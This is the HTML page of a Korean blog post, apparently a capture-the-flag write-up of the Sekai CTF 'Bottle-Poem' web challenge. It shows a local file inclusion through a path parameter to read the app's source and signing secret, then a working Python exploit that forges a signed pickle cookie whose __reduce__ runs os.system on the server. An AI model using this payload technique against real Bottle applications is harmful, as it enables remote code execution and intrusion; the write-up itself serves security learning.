@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Write Up 문제를 접속하면 아래와 같은 페이지가 나온다. sekai 링크들을 클릭해보면 아래와 같은 URL로 이동이 되면서 시가 나오는 페이지로 이동이 된다. 해당 링크에서 LF'><title>Sekai CTF Bottle-Poem Write Up</title>
+
+<link rel='canonical' href='https://appealso.github.io/p/sekai-ctf-bottle-poem-write-up/'>
+
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-J2H7Y6XC3K');
+</script><meta property='og:title' content='Sekai CTF Bottle-Poem Write Up'>
+<meta property='og:description' content='Write Up 문제를 접속하면 아래와 같은 페이지가 나온다. sekai 링크들을 클릭해보면 아래와 같은 URL로 이동이 되면서 시가 나오는 페이지로 이동이 된다. 해당 링크에서 LF'>
+<meta property='og:url' content='https://appealso.github.io/p/sekai-ctf-bottle-poem-write-up/'>
+<meta property='og:site_name' content='SooHo&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Sekai CTF' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='WEB' /><meta property='article:published_time' content='2022-10-22T11:23:15&#43;09:00'/><meta property='article:modified_time' content='2022-10-22T11:23:15&#43;09:00'/><meta property='og:image' content='https://appealso.github.io/p/sekai-ctf-bottle-poem-write-up/sekaictf.png' />
+<meta name="twitter:title" content="Sekai CTF Bottle-Poem Write Up">
+<meta name="twitter:description" content="Write Up 문제를 접속하면 아래와 같은 페이지가 나온다. sekai 링크들을 클릭해보면 아래와 같은 URL로 이동이 되면서 시가 나오는 페이지로 이동이 된다. 해당 링크에서 LF"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://appealso.github.io/p/sekai-ctf-bottle-poem-write-up/sekaictf.png' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-J2H7Y6XC3K', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/sekai-ctf-bottle-poem-write-up/">
+                <img src="/p/sekai-ctf-bottle-poem-write-up/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_800x0_resize_box_3.png"
+                        srcset="/p/sekai-ctf-bottle-poem-write-up/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_800x0_resize_box_3.png 800w, /p/sekai-ctf-bottle-poem-write-up/sekaictf_hu2550f7ad8b351e6fa8038bce33594268_150813_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="200" 
+                        loading="lazy"
+                        alt="Featured image of post Sekai CTF Bottle-Poem Write Up" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" style="background-color: #2a9d8f; color: #fff;">
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/sekai-ctf-bottle-poem-write-up/">Sekai CTF Bottle-Poem Write Up</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 22, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    2 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="write-up">Write Up</h2>
+<p>문제를 접속하면 아래와 같은 페이지가 나온다.</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 166; 
+			flex-basis: 399px"
+	>
+	<a href="/p/sekai-ctf-bottle-poem-write-up/sekai01.png" data-size="772x464">
+		<img src="/p/sekai-ctf-bottle-poem-write-up/sekai01.png"
+			width="772"
+			height="464"
+			srcset="/p/sekai-ctf-bottle-poem-write-up/sekai01_hu5f56472ab367cd6a46e8a1de0b757230_22960_480x0_resize_box_3.png 480w, /p/sekai-ctf-bottle-poem-write-up/sekai01_hu5f56472ab367cd6a46e8a1de0b757230_22960_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="sekai">
+	</a>
+	
+	<figcaption>sekai</figcaption>
+	
+</figure></p>
+<p>링크들을 클릭해보면 아래와 같은 URL로 이동이 되면서 시가 나오는 페이지로 이동이 된다. 해당 링크에서 LFI공격이 가능하다고 생각이 들었고 공격이 가능했다.</p>
+<pre tabindex="0"><code>http://localhost:8081/show?id=spring.txt
+</code></pre><p>LFI를 통해 앱이 실행되고 있는 페이지로 이동을 하면 아래와 같은 소스를 확인 할 수 있다.</p>
+<ul>
+<li>&lsquo;/proc/self/cwd&rsquo;는 현재 실행중인 프로세스의 디렉토리 표시하는 명령어다.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8081</span><span class="o">/</span><span class="n">show</span><span class="err">?</span><span class="nb">id</span><span class="o">=/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">cwd</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">py</span>
+
+<span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">error</span>
+<span class="kn">from</span> <span class="nn">config.secret</span> <span class="kn">import</span> <span class="n">sekai</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+
+<span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="p">)</span>
+
+
+<span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/show&#34;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">response</span><span class="o">.</span><span class="n">content_type</span> <span class="o">=</span> <span class="s2">&#34;text/plain; charset=UTF-8&#34;</span>
+    <span class="n">param</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">id</span>
+    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;^../app&#34;</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s2">&#34;No!!!!&#34;</span>
+    <span class="n">requested_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;/poems&#34;</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested_path</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">tfile</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&#34;No This Poems&#34;</span>
+    <span class="k">return</span> <span class="n">tfile</span>
+
+
+<span class="nd">@error</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">error404</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">)</span>
+
+
+<span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/sign&#34;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_cookie</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">sekai</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;guest&#34;</span><span class="p">:</span>
+            <span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;guest&#34;</span><span class="p">}</span>
+            <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">sekai</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;guest&#34;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s2">&#34;pls no hax&#34;</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
+    <span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">)</span>
+</code></pre></div><p>해당 소스를 보면 secret.py파일에서 sekai를 불러오는 것으로 보았을때 session에 사용되는 secret값을 추출하는 것을 추측할 수 있고, Python Bottle 프레임워크를 사용하는 것을 알 수 있다.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8081</span><span class="o">/</span><span class="n">show</span><span class="err">?</span><span class="nb">id</span><span class="o">=/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">cwd</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">secret</span><span class="o">.</span><span class="n">py</span>
+<span class="n">sekai</span> <span class="o">=</span> <span class="s2">&#34;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#34;</span>
+</code></pre></div><p>bottle 프레임워크 관련 문서를 검색해보면 RCE가 가능한것으로 확인이 되는데. bottle.py에서 사용되는 cookie 값을 가지고 RCE가 가능한것을 알 수 있다.</p>
+<ul>
+<li><a class="link" href="https://github.com/bottlepy/bottle/issues/900"  target="_blank" rel="noopener"
+    >https://github.com/bottlepy/bottle/issues/900</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">cookie_encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="s2">&#34;&#34;&#34; Encode and sign a pickle-able object. Return a (byte) string &#34;&#34;&#34;</span>
+    <span class="n">depr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="s2">&#34;cookie_encode() will be removed soon.&#34;</span><span class="p">,</span>
+                <span class="s2">&#34;Do not use this API directly.&#34;</span><span class="p">)</span>
+    <span class="n">digestmod</span> <span class="o">=</span> <span class="n">digestmod</span> <span class="ow">or</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+    <span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">tob</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">msg</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">digestmod</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">tob</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">sig</span> <span class="o">+</span> <span class="n">tob</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">msg</span>
+</code></pre></div><p>cookie_encode 코드를 가지고 exploit을 하면 flag를 txt로 생성하고, 해당 페이지에 접근하면 flag를 획득할 수 있다.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">pickle</span><span class="o">,</span> <span class="nn">requests</span>
+
+<span class="k">def</span> <span class="nf">tob</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">enc</span><span class="o">=</span><span class="s1">&#39;utf8&#39;</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span> <span class="k">if</span> <span class="n">s</span> <span class="ow">is</span> <span class="kc">None</span> <span class="k">else</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">RCE</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="kn">import</span> <span class="nn">os</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="s2">&#34;/flag &gt; /dev/shm/sekaiflag.txt&#34;</span><span class="p">,))</span>
+
+<span class="n">msg</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RCE</span><span class="p">(),</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">sig</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">tob</span><span class="p">(</span><span class="s2">&#34;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#34;</span><span class="p">),</span> <span class="n">msg</span><span class="p">,</span> <span class="n">digestmod</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">tob</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">sig</span> <span class="o">+</span> <span class="n">tob</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">msg</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;b&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;&#34;&#39;</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;http://localhost:8081/sign&#34;</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span> 
+</code></pre></div><pre tabindex="0"><code class="language-URL" data-lang="URL">URL: http://localhost:8081/show?id=/dev/shm/sekaiflag.txt
+SEKAI{W3lcome_To_Our_Bottle}
+</code></pre><h2 id="참고">참고</h2>
+<p><a class="link" href="https://aceatom.tistory.com/398"  target="_blank" rel="noopener"
+    >https://aceatom.tistory.com/398</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sekai-ctf/">Sekai CTF</a>
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/n00bzctf-reversing-encryption_with_matrices/">
+        
+        
+            <div class="article-image">
+                <img src="/p/n00bzctf-reversing-encryption_with_matrices/cover.8fbb065798b37fb4539bd9aef56e6809_hu9a07790b52a43b6c840a3a8793df70ef_7677_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post N00bzCTF [Reversing] - encryption_with_matrices"
+                        
+                        data-hash="md5-j7sGV5izf7RTm9mu9W5oCQ==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">N00bzCTF [Reversing] - encryption_with_matrices</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/hack-the-box-crypto-android-in-the-middle/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hack-the-box-crypto-android-in-the-middle/cover.d501c41fb23501887c35324a9d654cf1_hu6c7d8e00816a314732898bca532296f9_14244_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Hack The Box - [Crypto] - Android-in-the-Middle"
+                        
+                        data-hash="md5-1QHEH7I1AYh8NTJKnWVM8Q==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">Hack The Box - [Crypto] - Android-in-the-Middle</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/hack-the-box-misc-matrioshka-brain-matrioshka-brain/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hack-the-box-misc-matrioshka-brain-matrioshka-brain/cover.d501c41fb23501887c35324a9d654cf1_hu6c7d8e00816a314732898bca532296f9_14244_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Hack The Box - [MISC] -Matrioshka Brain Matrioshka Brain"
+                        
+                        data-hash="md5-1QHEH7I1AYh8NTJKnWVM8Q==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">Hack The Box - [MISC] -Matrioshka Brain Matrioshka Brain</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/n00bzctf-crpyto-rsa/">
+        
+        
+            <div class="article-image">
+                <img src="/p/n00bzctf-crpyto-rsa/cover.8fbb065798b37fb4539bd9aef56e6809_hu9a07790b52a43b6c840a3a8793df70ef_7677_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post N00bzCTF - [Crpyto] - RSA"
+                        
+                        data-hash="md5-j7sGV5izf7RTm9mu9W5oCQ==">
+                
+            </div>
+        
+        <div class="article-details">
+            <h2 class="article-title">N00bzCTF - [Crpyto] - RSA</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "appealso-github-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 SooHo&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+    </section>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1842197916935789" crossorigin="anonymous"></script>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <h1 class="widget-title section-title" style="text-align:center">TABLE OF CONTENTS</h1>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#write-up">Write Up</a></li>
+    <li><a href="#참고">참고</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
